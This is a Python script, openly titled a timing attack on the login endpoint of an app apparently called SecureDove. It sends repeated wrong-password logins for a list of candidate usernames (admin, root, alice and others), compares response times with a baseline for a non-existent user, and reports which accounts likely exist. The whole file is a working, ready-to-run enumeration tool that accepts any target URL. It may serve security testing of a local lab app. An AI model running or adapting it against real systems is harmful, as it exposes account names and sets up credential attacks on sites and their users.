#!/usr/bin/env python3
"""
SecureDove Timing Attack on Login Endpoint
Exploits timing differences between existing and non-existing users
"""

import requests
import time
import statistics
import sys
from typing import Dict, List, Tuple

class TimingAttacker:
    def __init__(self, base_url: str = "http://localhost:8000"):
        self.base_url = base_url.rstrip('/')
        self.api_url = f"{self.base_url}/api"
        self.session = requests.Session()

    def measure_login_time(self, username: str, password: str = "wrongpassword",
                          samples: int = 10) -> Tuple[float, float]:
        """Measure response time for login attempts"""
        times = []

        for _ in range(samples):
            try:
                start_time = time.perf_counter()

                response = self.session.post(
                    f"{self.api_url}/auth/login",
                    json={"username": username, "password": password},
                    timeout=10
                )

                end_time = time.perf_counter()
                response_time = end_time - start_time

                times.append(response_time)

            except requests.RequestException as e:
                print(f"[-] Request failed: {e}")
                continue

        if not times:
            return 0.0, 0.0

        avg_time = statistics.mean(times)
        std_dev = statistics.stdev(times) if len(times) > 1 else 0.0

        return avg_time, std_dev

    def analyze_timing_difference(self, nonexistent_user: str, potential_users: List[str],
                                password: str = "wrongpassword", samples: int = 10) -> List[Tuple[str, float, float]]:
        """Analyze timing differences to identify existing users"""

        print(f"[*] Measuring baseline with non-existent user: {nonexistent_user}")
        baseline_time, baseline_std = self.measure_login_time(nonexistent_user, password, samples)
        print(f"[+] Baseline: {baseline_time:.3f}s ± {baseline_std:.3f}s")

        results = []

        print(f"\n[*] Testing {len(potential_users)} potential users...")

        for username in potential_users:
            print(f"[*] Testing: {username}")
            user_time, user_std = self.measure_login_time(username, password, samples)
            print(f"[+] User {username}: {user_time:.3f}s ± {user_std:.3f}s")
            # Calculate difference from baseline
            time_diff = user_time - baseline_time
            confidence = abs(time_diff) / (baseline_std + user_std + 0.001)  # Avoid division by zero

            results.append((username, time_diff, confidence))

        return results

    def identify_existing_users(self, results: List[Tuple[str, float, float]],
                              threshold: float = 0.05) -> List[Tuple[str, float, float]]:
        """Identify users that likely exist based on timing analysis"""

        # Sort by timing difference (descending)
        sorted_results = sorted(results, key=lambda x: x[1], reverse=True)

        existing_users = []

        print("\n[*] Analysis Results (sorted by timing difference):")
        print("-" * 60)
        print(f"{'Username':<15} {'Time Diff':<12} {'Confidence':<10} {'Status'}")
        print("-" * 60)

        for username, time_diff, confidence in sorted_results:
            status = "LIKELY EXISTS" if time_diff > threshold else "PROBABLY NOT"
            print(f"{username:<15} {time_diff:<12.3f} {confidence:<10.2f} {status}")
            if time_diff > threshold:
                existing_users.append((username, time_diff, confidence))

        return existing_users

def main():
    if len(sys.argv) < 2:
        print("Usage: python timing_attack.py <base_url> [usernames_file]")
        print("Example: python timing_attack.py http://localhost:8000 usernames.txt")
        sys.exit(1)

    base_url = sys.argv[1]
    usernames_file = sys.argv[2] if len(sys.argv) > 2 else None

    attacker = TimingAttacker(base_url)

    # Default test users if no file provided
    if not usernames_file:
        potential_users = [
            "admin", "administrator", "root", "user", "test",
            "alice", "bob", "charlie", "david", "eve",
            "john", "jane", "mike", "sarah", "tom"
        ]
        print("[*] Using default username list")
    else:
        try:
            with open(usernames_file, 'r') as f:
                potential_users = [line.strip() for line in f if line.strip()]
            print(f"[*] Loaded {len(potential_users)} usernames from {usernames_file}")
        except FileNotFoundError:
            print(f"[-] File {usernames_file} not found")
            sys.exit(1)

    # Use a clearly non-existent username for baseline
    nonexistent_user = "definitely_not_a_real_user_xyz123"

    print(f"[*] Starting timing attack against {attacker.api_url}")
    print("[*] This may take a while due to multiple samples per user...")

    results = attacker.analyze_timing_difference(nonexistent_user, potential_users)

    existing_users = attacker.identify_existing_users(results)

    print("[+] Attack complete!")
    print(f"[+] Found {len(existing_users)} users that likely exist")

    if existing_users:
        print("\n[+] Likely existing users:")
        for username, time_diff, confidence in existing_users:
            print(f"{username:<15} {time_diff:<12.3f} {confidence:<10.2f}")

    print("\n[*] Note: This attack exploits timing differences in the login endpoint.")
    print("[*] Results may vary based on server load and network conditions.")
    print("[*] For more accurate results, run multiple times and average the results.")

if __name__ == "__main__":
    main()